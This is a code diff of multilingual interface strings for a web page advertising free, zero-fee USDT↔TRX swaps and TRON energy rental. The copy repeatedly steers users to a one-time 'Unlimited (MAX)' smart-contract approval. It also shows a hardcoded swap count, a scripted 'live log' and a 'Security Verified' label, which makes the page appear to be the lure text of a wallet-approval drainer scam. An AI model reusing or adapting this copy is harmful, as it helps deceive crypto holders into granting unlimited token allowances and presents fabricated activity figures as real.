-    th:{send_amount_trx:'จำนวนที่ส่ง (TRX)',receive_amount_usdt:'จำนวนที่ได้รับ (ประมาณ USDT)',w_imtoken:'กระเป๋าหลายเชนระดับโลก',w_wc:'เชื่อมต่อผ่าน QR',not_approved:'ยังไม่อนุมัติ',approved_max:'ไม่จำกัด (MAX)',approval_done:'อนุมัติแล้ว',modal_subtitle:'เลือกกระเป๋าเงิน<br>เพื่อเชื่อมต่ออัตโนมัติ',w_tronlink:'กระเป๋า TRON อย่างเป็นทางการ',w_trust:'กระเป๋าหลายเชน',w_tp:'ยอดนิยมในเอเชีย',w_bitget:'กระเป๋า Web3 ระดับโลก',w_okx:'กระเป๋า OKX',modal_tip_title:'หากแอปไม่เปิด:',modal_tip1:'1. เปิดแอปกระเป๋าด้วยตนเอง',modal_tip2:'2. ไปที่แท็บ<strong class="text-white">เบราว์เซอร์</strong>',modal_tip3:'3. <strong class="text-white">วาง</strong> URL',bal:'ยอด',bal2:'ยอด',close_btn:'ปิด',ticker_label:'การแลกเปลี่ยนแบบเรียลไทม์',header_sub:'USDT ↔ TRX แลกเปลี่ยนทันที | TRC-20',connect_wallet:'เชื่อมต่อ',hero_badge:'TRON MAINNET INSTANT SWAP',hero_title1:'USDT ↔ TRX',hero_title2:'แลกฟรี',hero_desc:'แลกเปลี่ยน USDT และ TRX ได้อย่างอิสระ ไม่มีค่าธรรมเนียม',today_volume:'ปริมาณวันนี้',swap_title:'USDT ↔ TRX แลกเปลี่ยน',swap_sub:'TRC-20 แลกทันที',approval_needed:'ต้องอนุมัติ',send_amount:'จำนวนที่ส่ง (USDT)',receive_amount:'จำนวนที่ได้รับ (ประมาณ)',exchange_rate_label:'อัตราแลกเปลี่ยน',fee_label:'ค่าธรรมเนียม',fee_free:'ฟรี',swap_btn_text:'เริ่มแลก (ต้องอนุมัติครั้งเดียว)',swap_btn_done:'แลกเลย',swap_notice:'การแลกครั้งแรกต้องอนุมัติสัญญาอัจฉริยะ',select_wallet:'เลือกกระเป๋า',security_title:'การรักษาความปลอดภัย',faq_title:'คำถามที่พบบ่อย',energy_badge:'TRON Energy',energy_title:'เช่าพลังงาน',energy_desc:'ประหยัดค่าธรรมเนียม USDT สูงสุด 80%',energy_target:'ที่อยู่เป้าหมาย',energy_amount:'จำนวนพลังงาน',energy_1usdt:'≈ 1 โอน USDT',energy_2usdt:'≈ 2 ครั้ง',energy_15usdt:'≈ 15 ครั้ง',energy_150usdt:'≈ 150 ครั้ง',energy_duration:'ระยะเวลา',energy_1h:'1 ชั่วโมง',energy_1d:'1 วัน',energy_3d:'3 วัน',energy_30d:'30 วัน',energy_est_price:'ค่าใช้จ่ายโดยประมาณ',energy_save_word:'ประหยัด',energy_save_max:'ประหยัดสูงสุด',energy_speed:'ทันที',energy_noncustodial:'ไม่มีผู้ดูแล',energy_addr_invalid:'กรุณาใส่ที่อยู่ TRON ที่ถูกต้อง',energy_coming_soon:'บริการเช่าพลังงานเร็วๆ นี้!',energy_approval_done:'อนุมัติแล้ว',energy_rent_btn_approve:'เช่าพลังงาน (อนุมัติครั้งแรก)',energy_rent_btn_done:'เช่าพลังงาน',energy_free_event:'เช่าพลังงานฟรี'},
-    vi:{send_amount_trx:'Số tiền gửi (TRX)',receive_amount_usdt:'Số tiền nhận (ước tính USDT)',w_imtoken:'Ví đa chuỗi toàn cầu',w_wc:'Kết nối qua QR',not_approved:'Chưa phê duyệt',approved_max:'Không giới hạn (MAX)',approval_done:'Đã phê duyệt',modal_subtitle:'Chọn ví của bạn<br>để kết nối tự động.',w_tronlink:'Ví chính thức TRON',w_trust:'Ví đa chuỗi',w_tp:'Phổ biến ở châu Á',w_bitget:'Ví Web3 toàn cầu',w_okx:'Ví sàn OKX',modal_tip_title:'Nếu ứng dụng không mở:',modal_tip1:'1. Mở ứng dụng ví thủ công',modal_tip2:'2. Vào tab <strong class="text-white">Trình duyệt</strong>',modal_tip3:'3. <strong class="text-white">Dán</strong> URL',bal:'Số dư',bal2:'Số dư',close_btn:'Đóng',ticker_label:'Giao dịch thời gian thực',header_sub:'USDT ↔ TRX Đổi ngay | TRC-20',connect_wallet:'Kết nối ví',hero_badge:'TRON MAINNET INSTANT SWAP',hero_title1:'USDT ↔ TRX',hero_title2:'Đổi miễn phí',hero_desc:'Tự do đổi giữa USDT và TRX với phí 0%.',today_volume:'Khối lượng hôm nay',swap_title:'USDT ↔ TRX Đổi',swap_sub:'TRC-20 đổi ngay',approval_needed:'Cần phê duyệt',send_amount:'Số tiền gửi (USDT)',receive_amount:'Số tiền nhận (ước tính)',exchange_rate_label:'Tỷ giá',fee_label:'Phí',fee_free:'Miễn phí',swap_btn_text:'Bắt đầu đổi (cần phê duyệt 1 lần)',swap_btn_done:'Đổi ngay',swap_notice:'Lần đổi đầu tiên cần phê duyệt hợp đồng thông minh',select_wallet:'Chọn ví',security_title:'Bảo mật',faq_title:'Câu hỏi thường gặp',energy_badge:'TRON Energy',energy_title:'Thuê năng lượng',energy_desc:'Tiết kiệm đến 80% phí chuyển USDT',energy_target:'Địa chỉ đích',energy_amount:'Số lượng năng lượng',energy_1usdt:'≈ 1 lần chuyển USDT',energy_2usdt:'≈ 2 lần chuyển',energy_15usdt:'≈ 15 lần chuyển',energy_150usdt:'≈ 150 lần chuyển',energy_duration:'Thời gian thuê',energy_1h:'1 giờ',energy_1d:'1 ngày',energy_3d:'3 ngày',energy_30d:'30 ngày',energy_est_price:'Chi phí ước tính',energy_save_word:'tiết kiệm',energy_save_max:'Tiết kiệm tối đa',energy_speed:'Tức thì',energy_noncustodial:'Không ủy thác',energy_addr_invalid:'Vui lòng nhập địa chỉ TRON hợp lệ',energy_coming_soon:'Dịch vụ thuê năng lượng sắp ra mắt!',energy_approval_done:'Đã phê duyệt',energy_rent_btn_approve:'Thuê năng lượng (phê duyệt 1 lần)',energy_rent_btn_done:'Thuê năng lượng',energy_free_event:'Thuê năng lượng miễn phí'},
-    ja:{send_amount_trx:'送金額 (TRX)',receive_amount_usdt:'受取額（予想 USDT）',w_imtoken:'グローバルマルチチェーンウォレット',w_wc:'QRコードで接続',not_approved:'未承認',approved_max:'無制限 (MAX)',approval_done:'交換承認済み',modal_subtitle:'ウォレットアプリを選択して<br>自動接続します。',w_tronlink:'TRON公式ウォレット',w_trust:'マルチチェーンウォレット',w_tp:'アジアで人気',w_bitget:'グローバルWeb3ウォレット',w_okx:'OKX取引所ウォレット',modal_tip_title:'アプリが開かない場合：',modal_tip1:'1. ウォレットアプリを手動で開く',modal_tip2:'2. アプリ内の<strong class="text-white">ブラウザ</strong>タブへ',modal_tip3:'3. URLを<strong class="text-white">貼り付け</strong>',bal:'残高',bal2:'残高',close_btn:'閉じる',ticker_label:'リアルタイム交換状況',header_sub:'USDT ↔ TRX 即時交換 | TRC-20 メインネット',connect_wallet:'ウォレット接続',hero_badge:'TRON メインネット即時スワップ',hero_title1:'USDT ↔ TRX',hero_title2:'無料交換',hero_desc:'手数料0%でUSDTとTRXを自由に交換。',today_volume:'本日の取引量',swap_title:'USDT ↔ TRX 交換',swap_sub:'TRC-20 即時スワップ',approval_needed:'承認が必要',send_amount:'送金額 (USDT)',receive_amount:'受取額（予想）',exchange_rate_label:'交換レート',fee_label:'手数料',fee_free:'無料',swap_btn_text:'交換開始（初回承認必要）',swap_btn_done:'交換する',swap_notice:'初回交換時にスマートコントラクトの承認が必要です',select_wallet:'ウォレットを選択',security_title:'セキュリティ検証',faq_title:'よくある質問',energy_badge:'TRON Energy',energy_title:'エネルギーレンタル',energy_desc:'USDT送金手数料を最大80%節約',energy_target:'対象アドレス',energy_amount:'エネルギー量',energy_1usdt:'≈ 1 USDT送金',energy_2usdt:'≈ 2回送金',energy_15usdt:'≈ 15回送金',energy_150usdt:'≈ 150回送金',energy_duration:'レンタル期間',energy_1h:'1時間',energy_1d:'1日',energy_3d:'3日間',energy_30d:'30日間',energy_est_price:'予想コスト',energy_save_word:'節約',energy_save_max:'最大節約',energy_speed:'即時充電',energy_noncustodial:'ノンカストディ',energy_addr_invalid:'有効なTRONアドレスを入力してください',energy_coming_soon:'エネルギーレンタルサービス準備中です！',energy_approval_done:'承認済み',energy_rent_btn_approve:'エネルギーレンタル（初回承認必要）',energy_rent_btn_done:'エネルギーをレンタル',energy_free_event:'エネルギーレンタル無料'},
-    de:{send_amount_trx:'Sie senden (TRX)',receive_amount_usdt:'Sie erhalten (geschätzt USDT)',w_imtoken:'Globales Multi-Chain Wallet',w_wc:'Per QR verbinden',not_approved:'Nicht genehmigt',approved_max:'Unbegrenzt (MAX)',approval_done:'Tausch genehmigt',modal_subtitle:'Wählen Sie Ihr Wallet<br>für automatische Verbindung.',w_tronlink:'TRON Offizielles Wallet',w_trust:'Multi-Chain Wallet',w_tp:'Beliebt in Asien',w_bitget:'Globales Web3 Wallet',w_okx:'OKX Börsen-Wallet',modal_tip_title:'Falls die App nicht öffnet:',modal_tip1:'1. Öffnen Sie die Wallet-App manuell',modal_tip2:'2. Gehen Sie zum <strong class="text-white">Browser</strong>-Tab',modal_tip3:'3. URL <strong class="text-white">einfügen</strong>',bal:'Guthaben',bal2:'Guthaben',close_btn:'Schließen',ticker_label:'Live-Austausch',header_sub:'USDT ↔ TRX Sofort-Tausch | TRC-20',connect_wallet:'Wallet verbinden',hero_badge:'TRON MAINNET SOFORT-TAUSCH',hero_title1:'USDT ↔ TRX',hero_title2:'Kostenlos tauschen',hero_desc:'Tauschen Sie frei zwischen USDT und TRX mit 0% Gebühr.',today_volume:'Heutiges Volumen',swap_title:'USDT ↔ TRX Tausch',swap_sub:'TRC-20 Sofort-Swap',approval_needed:'Genehmigung erforderlich',send_amount:'Sie senden (USDT)',receive_amount:'Sie erhalten (geschätzt)',exchange_rate_label:'Wechselkurs',fee_label:'Gebühr',fee_free:'Kostenlos',swap_btn_text:'Tausch starten (Genehmigung erforderlich)',swap_btn_done:'Jetzt tauschen',swap_notice:'Erstmaliger Tausch erfordert Smart-Contract-Genehmigung',select_wallet:'Wallet auswählen',security_title:'Sicherheit',faq_title:'Häufige Fragen',energy_badge:'TRON Energy',energy_title:'Energie mieten',energy_desc:'Sparen Sie bis zu 80%',energy_target:'Zieladresse',energy_amount:'Energiemenge',energy_1usdt:'≈ 1 USDT-Überweisung',energy_2usdt:'≈ 2 Überweisungen',energy_15usdt:'≈ 15 Überweisungen',energy_150usdt:'≈ 150 Überweisungen',energy_duration:'Mietdauer',energy_1h:'1 Stunde',energy_1d:'1 Tag',energy_3d:'3 Tage',energy_30d:'30 Tage',energy_est_price:'Geschätzte Kosten',energy_save_word:'Ersparnis',energy_save_max:'Max. Ersparnis',energy_speed:'Sofort',energy_noncustodial:'Nicht-verwahrend',energy_addr_invalid:'Bitte geben Sie eine gültige TRON-Adresse ein',energy_coming_soon:'Energie-Mietservice kommt bald!',energy_approval_done:'Genehmigt',energy_rent_btn_approve:'Energie mieten (Genehmigung)',energy_rent_btn_done:'Energie mieten',energy_free_event:'Energie kostenlos mieten'},
-    fr:{send_amount_trx:'Vous envoyez (TRX)',receive_amount_usdt:'Vous recevez (est. USDT)',w_imtoken:'Portefeuille multi-chaînes mondial',w_wc:'Connecter via QR',not_approved:'Non approuvé',approved_max:'Illimité (MAX)',approval_done:'Échange approuvé',modal_subtitle:'Sélectionnez votre portefeuille<br>pour une connexion automatique.',w_tronlink:'Portefeuille officiel TRON',w_trust:'Portefeuille multi-chaînes',w_tp:'Populaire en Asie',w_bitget:'Portefeuille Web3 mondial',w_okx:'Portefeuille OKX',modal_tip_title:'Si l\'appli ne s\'ouvre pas :',modal_tip1:'1. Ouvrez l\'appli manuellement',modal_tip2:'2. Allez dans l\'onglet <strong class="text-white">Navigateur</strong>',modal_tip3:'3. <strong class="text-white">Collez</strong> l\'URL',bal:'Solde',bal2:'Solde',close_btn:'Fermer',ticker_label:'Échanges en direct',header_sub:'USDT ↔ TRX Échange instantané | TRC-20',connect_wallet:'Connecter',hero_badge:'TRON MAINNET ÉCHANGE INSTANTANÉ',hero_title1:'USDT ↔ TRX',hero_title2:'Échange gratuit',hero_desc:'Échangez USDT contre TRX instantanément avec 0% de frais.',today_volume:'Volume du jour',swap_title:'USDT ↔ TRX Échange',swap_sub:'TRC-20 swap instantané',approval_needed:'Approbation requise',send_amount:'Vous envoyez (USDT)',receive_amount:'Vous recevez (est.)',exchange_rate_label:'Taux de change',fee_label:'Frais',fee_free:'Gratuit',swap_btn_text:'Commencer l\'échange (approbation)',swap_btn_done:'Échanger maintenant',swap_notice:'Le premier échange nécessite l\'approbation du contrat',select_wallet:'Choisir un portefeuille',security_title:'Sécurité vérifiée',faq_title:'Questions fréquentes',energy_badge:'TRON Energy',energy_title:'Location énergie',energy_desc:'Économisez jusqu\'à 80%',energy_target:'Adresse cible',energy_amount:'Quantité',energy_1usdt:'≈ 1 transfert USDT',energy_2usdt:'≈ 2 transferts',energy_15usdt:'≈ 15 transferts',energy_150usdt:'≈ 150 transferts',energy_duration:'Durée',energy_1h:'1 heure',energy_1d:'1 jour',energy_3d:'3 jours',energy_30d:'30 jours',energy_est_price:'Coût estimé',energy_save_word:'économie',energy_save_max:'Économie max.',energy_speed:'Instantané',energy_noncustodial:'Non-dépositaire',energy_addr_invalid:'Entrez une adresse TRON valide',energy_coming_soon:'Location énergie bientôt !',energy_approval_done:'Approuvé',energy_rent_btn_approve:'Louer énergie (approbation)',energy_rent_btn_done:'Louer énergie',energy_free_event:'Location énergie gratuite'},
-    es:{send_amount_trx:'Usted envía (TRX)',receive_amount_usdt:'Usted recibe (est. USDT)',w_imtoken:'Billetera multicadena global',w_wc:'Conectar por QR',not_approved:'No aprobado',approved_max:'Ilimitado (MAX)',approval_done:'Cambio aprobado',modal_subtitle:'Seleccione su billetera<br>para conectar automáticamente.',w_tronlink:'Billetera oficial TRON',w_trust:'Billetera multicadena',w_tp:'Popular en Asia',w_bitget:'Billetera Web3 global',w_okx:'Billetera OKX',modal_tip_title:'Si la app no se abre:',modal_tip1:'1. Abra la app manualmente',modal_tip2:'2. Vaya a la pestaña <strong class="text-white">Navegador</strong>',modal_tip3:'3. <strong class="text-white">Pegue</strong> la URL',bal:'Saldo',bal2:'Saldo',close_btn:'Cerrar',ticker_label:'Intercambios en vivo',header_sub:'USDT ↔ TRX Cambio instantáneo | TRC-20',connect_wallet:'Conectar',hero_badge:'TRON MAINNET INTERCAMBIO INSTANTÁNEO',hero_title1:'USDT ↔ TRX',hero_title2:'Cambio gratuito',hero_desc:'Cambie USDT a TRX al instante con 0% de comisión.',today_volume:'Volumen de hoy',swap_title:'USDT ↔ TRX Cambio',swap_sub:'TRC-20 swap instantáneo',approval_needed:'Aprobación requerida',send_amount:'Usted envía (USDT)',receive_amount:'Usted recibe (est.)',exchange_rate_label:'Tipo de cambio',fee_label:'Comisión',fee_free:'Gratis',swap_btn_text:'Iniciar cambio (aprobación)',swap_btn_done:'Cambiar ahora',swap_notice:'El primer cambio requiere aprobación del contrato',select_wallet:'Seleccionar billetera',security_title:'Seguridad verificada',faq_title:'Preguntas frecuentes',energy_badge:'TRON Energy',energy_title:'Alquilar energía',energy_desc:'Ahorre hasta un 80%',energy_target:'Dirección destino',energy_amount:'Cantidad de energía',energy_1usdt:'≈ 1 transferencia USDT',energy_2usdt:'≈ 2 transferencias',energy_15usdt:'≈ 15 transferencias',energy_150usdt:'≈ 150 transferencias',energy_duration:'Duración del alquiler',energy_1h:'1 hora',energy_1d:'1 día',energy_3d:'3 días',energy_30d:'30 días',energy_est_price:'Coste estimado',energy_save_word:'ahorro',energy_save_max:'Ahorro máximo',energy_speed:'Instantáneo',energy_noncustodial:'Sin custodia',energy_addr_invalid:'Introduzca una dirección TRON válida',energy_coming_soon:'¡Servicio de alquiler de energía próximamente!',energy_approval_done:'Aprobado',energy_rent_btn_approve:'Alquilar energía (aprobación)',energy_rent_btn_done:'Alquilar energía',energy_free_event:'Alquiler de energía gratis'}
+    ko:{send_amount_trx:'보내는 금액 (TRX)',receive_amount_usdt:'받는 금액 (예상 USDT)',w_imtoken:'글로벌 멀티체인 지갑',w_wc:'QR 코드로 다양한 지갑 연결',not_approved:'미승인',approved_max:'무제한 (MAX)',approval_done:'교환 승인 완료',modal_subtitle:'사용 중인 지갑 앱을 선택하면<br>자동으로 연결됩니다.',w_tronlink:'TRON 공식 지갑',w_trust:'멀티체인 지갑',w_tp:'아시아 인기 지갑',w_bitget:'글로벌 Web3 지갑',w_okx:'OKX 거래소 지갑',modal_tip_title:'앱이 자동으로 안 열리면:',modal_tip1:'1. 선택한 지갑 앱을 직접 여세요',modal_tip2:'2. 앱 내 <strong class="text-white">브라우저(탐색)</strong> 탭으로 이동',modal_tip3:'3. 주소창에 <strong class="text-white">붙여넣기</strong> (URL 자동 복사됨)',swap_count_val:'18,492 건',bal:'잔액',bal2:'잔액',log_system:'[시스템] TRON Mainnet 연결됨',log_waiting:'[대기] 지갑 감지 중...',step_auto:'자동 처리',live_log:'실시간 로그',disconnected:'DISCONNECTED',usdt_balance:'USDT 잔액',wallet_address:'지갑 주소',close_btn:'닫기',ticker_label:'실시간 교환 현황',header_sub:'USDT ↔ TRX 즉시 교환 | TRC-20 메인넷',connect_wallet:'지갑 연결',hero_badge:'TRON MAINNET INSTANT SWAP',hero_title1:'USDT ↔ TRX',hero_title2:'무료 교환',hero_desc:'수수료 0%로 USDT와 TRX를 자유롭게 교환하세요. 최초 1회 스마트 컨트랙트 승인 후 무제한 교환이 가능합니다.',today_volume:'오늘 총 교환량',free_event:'수수료 무료',swap_count:'교환 건수',steps_title:'교환 진행 단계',step_waiting:'대기 중',step1_title:'지갑 연결',step2_title:'교환 승인 (최초 1회)',step2_desc:'USDT 스마트 컨트랙트 교환 권한 승인',step3_title:'TRX 즉시 입금',step3_desc:'교환된 TRX가 지갑으로 자동 입금됩니다.',swap_title:'USDT ↔ TRX 교환',swap_sub:'TRC-20 즉시 스왑',approval_needed:'교환 승인 필요',send_amount:'보내는 금액 (USDT)',receive_amount:'받는 금액 (예상)',exchange_rate_label:'교환 비율',fee_label:'수수료',fee_free:'무료',swap_btn_text:'교환 시작 (최초 1회 승인 필요)',swap_btn_done:'교환하기',swap_notice:'최초 1회 교환시 스마트 컨트렉트 승인이 필요합니다',wallet_info:'지갑 연동 정보',wallet_not_connected:'지갑이 연결되어 있지 않습니다',wallet_guide:'지갑 앱의 DApp 브라우저에서 접속하세요.',swap_status:'교환 상태',select_wallet:'지갑을 선택하세요',security_title:'보안 검증',faq_title:'자주 묻는 질문 (FAQ)',modal_success:'교환 승인 완료!',modal_desc:'USDT ↔ TRX 교환 권한이 승인되었습니다.',energy_badge:'TRON Energy',energy_title:'에너지 렌탈',energy_desc:'USDT 전송 수수료를 최대 80% 절약하세요',energy_tab_energy:'에너지',energy_tab_bandwidth:'대역폭',energy_target:'대상 주소',energy_my_addr:'내 주소 사용',energy_amount:'에너지 수량',energy_1usdt:'≈ 1 USDT 전송',energy_2usdt:'≈ 2회 전송',energy_15usdt:'≈ 15회 전송',energy_150usdt:'≈ 150회 전송',energy_duration:'렌탈 기간',energy_1h:'1시간',energy_1d:'1일',energy_3d:'3일',energy_30d:'30일',energy_est_price:'예상 비용',energy_save_word:'절약',energy_save_max:'최대 절약',energy_speed:'즉시 충전',energy_noncustodial:'비수탁',energy_addr_invalid:'유효한 TRON 주소를 입력하세요',energy_coming_soon:'에너지 렌탈 서비스 준비 중입니다. 곧 오픈합니다!',energy_approval_done:'승인 완료',energy_rent_btn_approve:'에너지 렌탈 (최초 1회 승인 필요)',energy_rent_btn_done:'에너지 렌탈하기',energy_free_event:'에너지 렌탈 무료 제공'},
+    en:{send_amount_trx:'You Send (TRX)',receive_amount_usdt:'You Receive (Est. USDT)',w_imtoken:'Global Multi-chain Wallet',w_wc:'Connect via QR code',not_approved:'Unapproved',approved_max:'Unlimited (MAX)',approval_done:'Swap Approved',modal_subtitle:'Select your wallet app<br>to connect automatically.',w_tronlink:'TRON Official Wallet',w_trust:'Multi-chain Wallet',w_tp:'Popular in Asia',w_bitget:'Global Web3 Wallet',w_okx:'OKX Exchange Wallet',modal_tip_title:'If the app doesn\'t open:',modal_tip1:'1. Open the wallet app manually',modal_tip2:'2. Go to <strong class="text-white">Browser</strong> tab',modal_tip3:'3. <strong class="text-white">Paste</strong> the URL (auto-copied)',swap_count_val:'18,492 swaps',bal:'Balance',bal2:'Balance',log_system:'[System] TRON Mainnet connected',log_waiting:'[Wait] Detecting wallet...',step_auto:'Auto Process',live_log:'Live Log',disconnected:'DISCONNECTED',usdt_balance:'USDT Balance',wallet_address:'Wallet Address',close_btn:'Close',ticker_label:'Live Exchange Feed',header_sub:'USDT ↔ TRX Instant Swap | TRC-20 Mainnet',connect_wallet:'Connect Wallet',hero_badge:'TRON MAINNET INSTANT SWAP',hero_title1:'USDT ↔ TRX',hero_title2:'Free Swap',hero_desc:'Swap freely between USDT and TRX with 0% fee. One-time smart contract approval enables unlimited swaps.',today_volume:'Today\'s Volume',free_event:'Zero Fee',swap_count:'Swaps',steps_title:'How It Works',step_waiting:'Waiting',step1_title:'Connect Wallet',step2_title:'Approve (One-time)',step2_desc:'USDT smart contract swap authorization',step3_title:'Receive TRX',step3_desc:'Swapped TRX is deposited to your wallet instantly.',swap_title:'USDT ↔ TRX Swap',swap_sub:'TRC-20 Instant Swap',approval_needed:'Approval Required',send_amount:'You Send (USDT)',receive_amount:'You Receive (Est.)',exchange_rate_label:'Exchange Rate',fee_label:'Fee',fee_free:'Free',swap_btn_text:'Start Swap (One-time Approval Required)',swap_btn_done:'Swap Now',swap_notice:'First swap requires smart contract approval',wallet_info:'Wallet Info',wallet_not_connected:'Wallet not connected',wallet_guide:'Open in wallet app\'s DApp browser.',swap_status:'Swap Status',select_wallet:'Select Your Wallet',security_title:'Security Verified',faq_title:'FAQ',modal_success:'Swap Approved!',modal_desc:'USDT ↔ TRX swap authorization confirmed.',energy_badge:'TRON Energy',energy_title:'Rent Energy',energy_desc:'Save up to 80% on USDT transfer fees',energy_tab_energy:'Energy',energy_tab_bandwidth:'Bandwidth',energy_target:'Target Address',energy_my_addr:'Use My Address',energy_amount:'Energy Amount',energy_1usdt:'≈ 1 USDT transfer',energy_2usdt:'≈ 2 transfers',energy_15usdt:'≈ 15 transfers',energy_150usdt:'≈ 150 transfers',energy_duration:'Rental Duration',energy_1h:'1 Hour',energy_1d:'1 Day',energy_3d:'3 Days',energy_30d:'30 Days',energy_est_price:'Est. Cost',energy_save_word:'savings',energy_save_max:'Max Savings',energy_speed:'Instant',energy_noncustodial:'Non-custodial',energy_addr_invalid:'Please enter a valid TRON address',energy_coming_soon:'Energy rental service coming soon!',energy_approval_done:'Approved',energy_rent_btn_approve:'Rent Energy (One-time Approval)',energy_rent_btn_done:'Rent Energy',energy_free_event:'Free Energy Rental'},
+    zh:{send_amount_trx:'发送金额 (TRX)',receive_amount_usdt:'接收金额（预估 USDT）',w_imtoken:'全球多链钱包',w_wc:'通过QR码连接',not_approved:'未授权',approved_max:'无限制 (MAX)',approval_done:'授权完成',modal_subtitle:'选择您的钱包应用<br>自动连接。',w_tronlink:'TRON 官方钱包',w_trust:'多链钱包',w_tp:'亚洲热门钱包',w_bitget:'全球 Web3 钱包',w_okx:'OKX 交易所钱包',modal_tip_title:'如果应用未自动打开：',modal_tip1:'1. 手动打开钱包应用',modal_tip2:'2. 进入应用内的<strong class="text-white">浏览器</strong>选项卡',modal_tip3:'3. 在地址栏<strong class="text-white">粘贴</strong>网址',swap_count_val:'18,492 笔',bal:'余额',bal2:'余额',log_system:'[系统] TRON 主网已连接',log_waiting:'[等待] 正在检测钱包...',step_auto:'自动处理',live_log:'实时日志',disconnected:'未连接',usdt_balance:'USDT 余额',wallet_address:'钱包地址',close_btn:'关闭',ticker_label:'实时交换动态',header_sub:'USDT ↔ TRX 即时兑换 | TRC-20 主网',connect_wallet:'连接钱包',hero_badge:'TRON 主网即时兑换',hero_title1:'USDT ↔ TRX',hero_title2:'免费兑换',hero_desc:'0%手续费自由兑换USDT与TRX。首次智能合约授权后可无限兑换。',today_volume:'今日交易量',free_event:'零手续费',swap_count:'交换次数',steps_title:'兑换步骤',step_waiting:'等待中',step1_title:'连接钱包',step2_title:'授权（仅首次）',step2_desc:'USDT智能合约兑换授权',step3_title:'收到TRX',step3_desc:'兑换的TRX将自动存入您的钱包。',swap_title:'USDT ↔ TRX 兑换',swap_sub:'TRC-20 即时兑换',approval_needed:'需要授权',send_amount:'发送金额 (USDT)',receive_amount:'接收金额（预估）',exchange_rate_label:'汇率',fee_label:'手续费',fee_free:'免费',swap_btn_text:'开始兑换（首次需授权）',swap_btn_done:'立即兑换',swap_notice:'首次兑换需要智能合约授权',wallet_info:'钱包信息',wallet_not_connected:'钱包未连接',wallet_guide:'请在钱包应用的DApp浏览器中打开。',swap_status:'兑换状态',select_wallet:'选择钱包',security_title:'安全验证',faq_title:'常见问题',modal_success:'授权成功！',modal_desc:'USDT ↔ TRX兑换权限已确认。',energy_badge:'TRON Energy',energy_title:'租用能量',energy_desc:'USDT转账手续费最高节省80%',energy_tab_energy:'能量',energy_tab_bandwidth:'带宽',energy_target:'目标地址',energy_my_addr:'使用我的地址',energy_amount:'能量数量',energy_1usdt:'≈ 1次USDT转账',energy_2usdt:'≈ 2次转账',energy_15usdt:'≈ 15次转账',energy_150usdt:'≈ 150次转账',energy_duration:'租用时长',energy_1h:'1小时',energy_1d:'1天',energy_3d:'3天',energy_30d:'30天',energy_est_price:'预估费用',energy_save_word:'节省',energy_save_max:'最高节省',energy_speed:'即时到账',energy_noncustodial:'非托管',energy_addr_invalid:'请输入有效的TRON地址',energy_coming_soon:'能量租用服务即将上线！',energy_approval_done:'已授权',energy_rent_btn_approve:'租用能量（首次需授权）',energy_rent_btn_done:'租用能量',energy_free_event:'能量租用免费'},
+    ru:{send_amount_trx:'Вы отправляете (TRX)',receive_amount_usdt:'Вы получаете (прибл. USDT)',w_imtoken:'Глобальный мультичейн кошелёк',w_wc:'Подключение через QR',not_approved:'Не одобрено',approved_max:'Безлимитно (MAX)',approval_done:'Обмен одобрен',modal_subtitle:'Выберите кошелёк<br>для автоматического подключения.',w_tronlink:'Официальный кошелёк TRON',w_trust:'Мультичейн кошелёк',w_tp:'Популярный в Азии',w_bitget:'Глобальный Web3 кошелёк',w_okx:'Кошелёк биржи OKX',modal_tip_title:'Если приложение не открылось:',modal_tip1:'1. Откройте кошелёк вручную',modal_tip2:'2. Перейдите во вкладку <strong class="text-white">Браузер</strong>',modal_tip3:'3. <strong class="text-white">Вставьте</strong> URL',swap_count_val:'18,492 сделок',bal:'Баланс',bal2:'Баланс',log_system:'[Система] TRON Mainnet подключён',log_waiting:'[Ожидание] Обнаружение кошелька...',step_auto:'Автоматически',live_log:'Журнал',disconnected:'ОТКЛЮЧЕНО',usdt_balance:'Баланс USDT',wallet_address:'Адрес кошелька',close_btn:'Закрыть',ticker_label:'Обмены в реальном времени',header_sub:'USDT ↔ TRX Мгновенный обмен | TRC-20',connect_wallet:'Подключить',hero_badge:'TRON MAINNET МГНОВЕННЫЙ ОБМЕН',hero_title1:'USDT ↔ TRX',hero_title2:'Бесплатный обмен',hero_desc:'Свободно обменивайте USDT и TRX с комиссией 0%.',today_volume:'Объём за сегодня',free_event:'Без комиссии',swap_count:'Обменов',steps_title:'Как это работает',step_waiting:'Ожидание',step1_title:'Подключение',step2_title:'Одобрение (1 раз)',step2_desc:'Авторизация смарт-контракта USDT',step3_title:'Получение TRX',step3_desc:'TRX автоматически поступит в ваш кошелёк.',swap_title:'USDT ↔ TRX Обмен',swap_sub:'TRC-20 мгновенный обмен',approval_needed:'Требуется одобрение',send_amount:'Вы отправляете (USDT)',receive_amount:'Вы получаете (прибл.)',exchange_rate_label:'Курс обмена',fee_label:'Комиссия',fee_free:'Бесплатно',swap_btn_text:'Начать обмен (одобрение необходимо)',swap_btn_done:'Обменять',swap_notice:'Первый обмен требует одобрения смарт-контракта',wallet_info:'Информация о кошельке',wallet_not_connected:'Кошелёк не подключён',wallet_guide:'Откройте в DApp-браузере кошелька.',swap_status:'Статус обмена',select_wallet:'Выберите кошелёк',security_title:'Безопасность',faq_title:'Вопросы и ответы',modal_success:'Одобрение завершено!',modal_desc:'Авторизация обмена USDT ↔ TRX подтверждена.',energy_badge:'TRON Energy',energy_title:'Аренда энергии',energy_desc:'Экономьте до 80% на комиссии USDT',energy_tab_energy:'Энергия',energy_tab_bandwidth:'Пропускная способность',energy_target:'Целевой адрес',energy_my_addr:'Мой адрес',energy_amount:'Количество энергии',energy_1usdt:'≈ 1 перевод USDT',energy_2usdt:'≈ 2 перевода',energy_15usdt:'≈ 15 переводов',energy_150usdt:'≈ 150 переводов',energy_duration:'Срок аренды',energy_1h:'1 час',energy_1d:'1 день',energy_3d:'3 дня',energy_30d:'30 дней',energy_est_price:'Расч. стоимость',energy_save_word:'экономия',energy_save_max:'Макс. экономия',energy_speed:'Мгновенно',energy_noncustodial:'Некастодиальный',energy_addr_invalid:'Введите действительный адрес TRON',energy_coming_soon:'Сервис аренды энергии скоро откроется!',energy_approval_done:'Одобрено',energy_rent_btn_approve:'Аренда энергии (одобрение)',energy_rent_btn_done:'Арендовать энергию',energy_free_event:'Аренда энергии бесплатно'},
